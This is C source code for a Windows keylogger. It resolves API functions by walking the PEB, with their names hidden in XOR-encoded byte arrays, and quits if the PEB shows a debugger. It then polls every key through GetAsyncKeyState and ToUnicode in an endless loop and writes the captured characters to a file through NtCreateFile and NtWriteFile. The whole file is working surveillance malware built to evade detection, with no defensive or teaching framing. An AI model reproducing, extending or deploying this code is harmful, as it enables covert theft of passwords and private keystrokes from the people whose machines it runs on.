#pragma function(memset)
void* memset(void* dest, int c, size_t count) {
    char* bytes = (char*)dest;
    while (count--) {
        *bytes++ = (char)c;
    }
    return dest;
}

void *memcpy(void *dest, const void* src, size_t len) {
    char *d = dest;
    const char *s = src;
    while(len--) {
        *d++ = *s++;
    }
    return dest;
}

int __stdio_common_vsprintf() { return 0; }

#include "./include/peb_walker.h"
#include "./include/asm_io.h"
#define ACC_SIZE 100

short is_down(int keystroke, void* get_async_addr) {
    short pressed;

    __asm__ __volatile__ (
        "pushq %%rbp\n"             // Saves rbp
        "movq %%rsp, %%rbp\n"       // Creates stack frame
        "andq $-16, %%rsp\n"        // Aligns stack pointer
        "subq $32, %%rsp\n"         // Shadows space
        "movl %2, %%ecx\n"          // Loads the keystroke inside ecx
        "call *%1\n"                // Calls GetAsyncKeyState
        "movq %%rbp, %%rsp\n"       // Restores RSP
        "popq %%rbp\n"              // Restores RBP
        "movw %%ax, %0\n"          // Moves the current key state from ax to pressed
        : "=r" (pressed)
        : "r" (get_async_addr), "r" (keystroke)
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
    );

    return pressed;
}

int to_unicode(uint32_t wVirtKey, uint32_t wScanCode, const uint8_t* lpKeyState, uint16_t* pwszBuff, int cchBuff, uint32_t wFlags, void* to_unicode_addr) {
    int result;

    __asm__ __volatile__ (
        "pushq %%rbp\n\t"
        "movq %%rsp, %%rbp\n\t"
        "andq $-16, %%rsp\n\t"          // Alinhamento crucial
        "subq $48, %%rsp\n\t"           // 32 (shadow) + 16 (args 5 e 6)

        "movq %[state], %%r8\n\t"       // Arg 3: lpKeyState
        "movq %[buff], %%r9\n\t"        // Arg 4: pwszBuff
        
        // Importante: ToUnicode espera 32-bit (int) na pilha para cchBuff
        "movl %[cch], %%eax\n\t"        
        "movl %%eax, 32(%%rsp)\n\t"     // Offset 32: cchBuff
        
        "movl %[flags], %%eax\n\t"      
        "movl %%eax, 40(%%rsp)\n\t"     // Offset 40: wFlags
        
        "call *%[addr]\n\t"             
        "movl %%eax, %[res]\n\t"        
        
        "leave\n\t"
        : [res] "=r" (result)
        : [vk] "c" (wVirtKey),              // Arg 1: RCX
        [sc] "d" (wScanCode),          // Arg 2: RDX
        [state] "r" (lpKeyState),
        [buff] "r" (pwszBuff),
        [cch] "er" (2),               // Tamanho do buffer (2)
        [flags] "er" (0),             // Flags (0)
        [addr] "r" (to_unicode_addr)
        : "rax", "r8", "r9", "r10", "r11", "memory"
    );

    return result;
}

void sleep(void* delay_exec_addr, long long duration) {
    long long interval = duration; 

    __asm__ __volatile__ (
        "pushq %%rbp\n"
        "movq %%rsp, %%rbp\n"
        "andq $-16, %%rsp\n"
        "subq $48, %%rsp\n"
        
        "movq %1, 32(%%rsp)\n"
        "xorq %%rcx, %%rcx\n"
        "leaq 32(%%rsp), %%rdx\n"
        
        "call *%0\n"
        
        "movq %%rbp, %%rsp\n"
        "popq %%rbp\n"
        : 
        : "r" (delay_exec_addr), "r" (interval)
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
    );    
}

uint32_t mapvirtualkey_func(uint32_t uCode, uint32_t uMapType, void* mapvirtual_addr) {
    uint32_t result;

    __asm__ __volatile__ (
        "pushq %%rbp\n\t"
        "movq %%rsp, %%rbp\n\t"
        "andq $-16, %%rsp\n\t"    // Alinha em 16
        "subq $48, %%rsp\n\t"     // 32 (shadow) + 16 (espaço extra para manter alinhamento)
        
        "movl %[code], %%ecx\n\t" // RCX = uCode
        "movl %[type], %%edx\n\t" // RDX = uMapType

        "call *%[addr]\n\t"       
        "movl %%eax, %[res]\n\t"  // Resgate o resultado de EAX
        "leave\n\t"
        : [res] "=r" (result)
        : [code] "r" (uCode), 
        [type] "r" (uMapType), 
        [addr] "r" (mapvirtual_addr)
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
    );

    return result;
}

int main() {
    PEB_Scavenger peb = init_scavenger();

    uint32_t debbuged;

    __asm__ __volatile__ (
        "movq %%gs:0x60, %%rax\n" // RAX = PEB
        "movl 0xbc(%%rax), %0"
        : "=r" (debbuged)
        :
        : "memory", "%rax"
    );

    if(debbuged != 0) {
        quit(&peb);
    }

    unsigned char mixer[32] = {0x3, 0xE, 0xFC, 0x22, 0xE2, 0x2F, 0x25, 0x70, 0x4, 0x7F, 0x1D, 0x87, 0x1E, 0x89, 0x68, 0x58, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};

    unsigned char dllname[32] = {0x76, 0x7D, 0x99, 0x50, 0xD1, 0x1D, 0xB, 0x14, 0x68, 0x13, 0x1D, 0x87, 0x1E, 0x89, 0x68, 0x58, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};
    unsigned char funcname[32] = {0x44, 0x6B, 0x88, 0x63, 0x91, 0x56, 0x4B, 0x13, 0x4F, 0x1A, 0x64, 0xD4, 0x6A, 0xE8, 0x1C, 0x3D, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};
    unsigned char ntdllname[32] = {0x6D, 0x7A, 0x98, 0x4E, 0x8E, 0x1, 0x41, 0x1C, 0x68, 0x7F, 0x1D, 0x87, 0x1E, 0x89, 0x68, 0x58, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};
    unsigned char delayexec_name[32] = {0x4D, 0x7A, 0xB8, 0x47, 0x8E, 0x4E, 0x5C, 0x35, 0x7C, 0x1A, 0x7E, 0xF2, 0x6A, 0xE0, 0x7, 0x36, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};
    unsigned char tounicode_name[32] = {0x57, 0x61, 0xA9, 0x4C, 0x8B, 0x4C, 0x4A, 0x14, 0x61, 0x7F, 0x1D, 0x87, 0x1E, 0x89, 0x68, 0x58, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};
    unsigned char mapvirtual_name[32] = {0x4E, 0x6F, 0x8C, 0x74, 0x8B, 0x5D, 0x51, 0x5, 0x65, 0x13, 0x56, 0xE2, 0x67, 0xDE, 0x68, 0x58, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};
    unsigned char createfile_name[32] = {0x4D, 0x7A, 0xBF, 0x50, 0x87, 0x4E, 0x51, 0x15, 0x42, 0x16, 0x71, 0xE2, 0x1E, 0x89, 0x68, 0x58, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};
    unsigned char writefile_name[32] = {0x4D, 0x7A, 0xAB, 0x50, 0x8B, 0x5B, 0x40, 0x36, 0x6D, 0x13, 0x78, 0x87, 0x1E, 0x89, 0x68, 0x58, 0xE9, 0xC, 0x9, 0xFB, 0xDD, 0x36, 0xF5, 0x2, 0x15, 0x42, 0x5F, 0x80, 0xA6, 0xB2, 0x63, 0x88};

    for(int i=0; i < 32; i++) {
        dllname[i] ^= mixer[i];
        funcname[i] ^= mixer[i];
        ntdllname[i] ^= mixer[i];
        delayexec_name[i] ^= mixer[i];
        tounicode_name[i] ^= mixer[i];
        mapvirtual_name[i] ^= mixer[i];
        createfile_name[i] ^= mixer[i];
        writefile_name[i] ^= mixer[i];
    }

    void* user32_dll = getDllAddr(dllname, &peb);
    void* ntdll_addr = getDllAddr(ntdllname, &peb);

    void* asynckeystate = getDllFunctionAddr(funcname, user32_dll, &peb);
    void* ntdelayexec = getDllFunctionAddr(delayexec_name, ntdll_addr, &peb);
    void* ntcreatefile_addr = getDllFunctionAddr(createfile_name, ntdll_addr, &peb);
    void* ntwritefile_addr = getDllFunctionAddr(writefile_name, ntdll_addr, &peb);
    void* tounicode = getDllFunctionAddr(tounicode_name, user32_dll, &peb);
    void* mapvirtualkey = getDllFunctionAddr(mapvirtual_name, user32_dll, &peb);

    void* dumphandle = simple_create_file(ntcreatefile_addr);

    char accumulator[ACC_SIZE];
    int acc_indx = 0;

    while(1) {
        for (int vkey = 0; vkey < 256; vkey++) {
            short state = is_down(vkey, asynckeystate);

            if (state & 0x8000) {
                if(vkey == 0x14) { // VK_CAPITAL
                    accumulator[acc_indx++] = 0x14;
                    if(acc_indx >= ACC_SIZE) {
                        acc_indx = 0;
                        simple_write_file(ntwritefile_addr, dumphandle, accumulator, ACC_SIZE);
                    }
                    continue;
                } else if(vkey == 0x08 && acc_indx > 0) {
                    accumulator[--acc_indx] = 0;
                    continue;
                } else if (vkey == 0x0D) { // VK_RETURN
                    accumulator[acc_indx++] = '\n';
                    if(acc_indx >= ACC_SIZE) {
                        acc_indx = 0;
                        simple_write_file(ntwritefile_addr, dumphandle, accumulator, ACC_SIZE);
                    }
                    continue;
                }

                uint8_t key_state[256];
                for (int i = 0; i < 256; i++) {
                    key_state[i] = (is_down(i, asynckeystate) & 0x8000) ? 0x80 : 0;
                }

                uint16_t buffer[2];

                uint32_t scanCode = mapvirtualkey_func(vkey, 0, mapvirtualkey);
                int result = to_unicode(vkey, scanCode, key_state, buffer, 2, 0, tounicode);

                if (result > 0) {
                    accumulator[acc_indx++] = (char)buffer[0];
                    if(acc_indx >= ACC_SIZE) {
                        acc_indx = 0;
                        simple_write_file(ntwritefile_addr, dumphandle, accumulator, ACC_SIZE);
                    }
                }
            }
        }

        sleep(ntdelayexec, -1000000);
    }

    quit(&peb);
}
